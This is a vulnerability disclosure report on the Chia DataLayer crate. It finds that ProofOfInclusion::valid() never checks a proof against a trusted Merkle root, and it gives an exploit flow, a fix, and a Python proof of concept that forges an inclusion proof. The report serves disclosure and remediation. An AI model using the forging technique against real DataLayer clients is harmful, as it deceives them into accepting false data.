### Title
`ProofOfInclusion::valid()` Missing Trusted Root Anchor Check Enables Forged DataLayer Inclusion Proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` contains a tautological final check that is always `true` after the loop passes, meaning the function only verifies internal hash-chain consistency and never anchors the proof to any external trusted root. An unprivileged caller can construct a `ProofOfInclusion` with an arbitrary `node_hash` and internally consistent `layers`, pass it to `valid()`, and receive `true` — regardless of what Merkle root the proof actually claims. The struct and its `valid()` method are fully exposed through the Python bindings, making this reachable from any Python DataLayer consumer.

### Finding Description

**Root cause — tautological final check in `valid()`**

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← existing_hash := layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true (see below)
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same value as existing_hash after loop
    } else {
        self.node_hash              // ← same value as existing_hash when layers is empty
    }
}
```

**Case 1 — non-empty `layers`:** After the loop, `existing_hash` equals `last_layer.combined_hash` (the loop body sets `existing_hash = calculated_hash` only after asserting `calculated_hash == layer.combined_hash`). `root_hash()` also returns `last_layer.combined_hash`. The final comparison is therefore `last_layer.combined_hash == last_layer.combined_hash` — unconditionally `true`.

**Case 2 — empty `layers`:** `existing_hash` is never updated, so it remains `self.node_hash`. `root_hash()` returns `self.node_hash`. Again unconditionally `true`.

In both cases the final guard is a no-op. `valid()` only checks that each layer's `combined_hash` is the correct SHA-256 combination of the previous hash and `other_hash`; it never checks that the resulting root equals any externally trusted value.

**Exposed attack surface**

`ProofOfInclusion` is declared `pyclass(get_all, from_py_object)` and carries a public `__new__` constructor and `from_bytes` / `from_bytes_unchecked` deserializers in the Python bindings:

```python
def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...
@classmethod
def from_bytes(cls, blob: bytes) -> Self: ...
@classmethod
def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
def valid(self) -> bool: ...
```

Any Python caller — including a DataLayer peer or RPC client — can supply arbitrary bytes, deserialize them into a `ProofOfInclusion`, and invoke `valid()`.

**Exploit flow**

1. Attacker picks any target `node_hash` (e.g., the hash of a key-value pair they wish to falsely claim is in the tree).
2. Attacker builds one or more `ProofOfInclusionLayer` objects where each `combined_hash` is correctly computed from the previous hash and a chosen `other_hash` — trivially done with the public `calculate_internal_hash` logic.
3. Attacker serializes the forged `ProofOfInclusion` and delivers it to a DataLayer client (over the network, via RPC, or directly through the Python API).
4. Client calls `proof.valid()` → returns `true`.
5. Client calls `proof.root_hash()` → returns the attacker-chosen root, not the real committed root.
6. If the client does not separately compare `proof.root_hash()` against a locally trusted root, it accepts the forged proof.

### Impact Explanation

Any DataLayer consumer that relies solely on `proof.valid()` to accept or reject an inclusion proof can be convinced that an arbitrary key-value pair exists in a Merkle tree it does not actually belong to. This directly matches the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."*

### Likelihood Explanation

The Python binding exposes `ProofOfInclusion.__new__`, `from_bytes`, and `from_bytes_unchecked` without restriction. Constructing an internally consistent forged proof requires only public hash arithmetic — no privileged keys, no chain access, no special role. The misleading name `valid()` (with no root-hash parameter) makes it likely that downstream Python code treats a `True` return as sufficient proof of inclusion.

### Recommendation

Add a mandatory `expected_root: Hash` parameter to `valid()` and compare `existing_hash` against it instead of (or in addition to) `self.root_hash()`:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // anchored to caller-supplied trusted root
}
```

Update the Python binding signature accordingly (`def valid(self, expected_root: bytes32) -> bool`), and update all call sites (tests, fuzz targets) to pass the known trusted root.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Step 1: choose an arbitrary node_hash (the "leaf" we want to forge)
fake_node_hash = bytes([0xAB] * 32)

# Step 2: build one internally consistent layer
other_hash = bytes([0xCD] * 32)
# replicate calculate_internal_hash: sha256(b"\x02" + left + right)
combined = hashlib.sha256(b"\x02" + fake_node_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Right side
    other_hash=other_hash,
    combined_hash=combined,
)

# Step 3: construct the forged proof
forged = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# Step 4: valid() returns True — no trusted root was checked
assert forged.valid() is True

# Step 5: root_hash() returns the attacker-chosen combined hash
assert forged.root_hash() == combined

# A client that only checks proof.valid() accepts this forged proof
# for fake_node_hash under the attacker-controlled root `combined`.
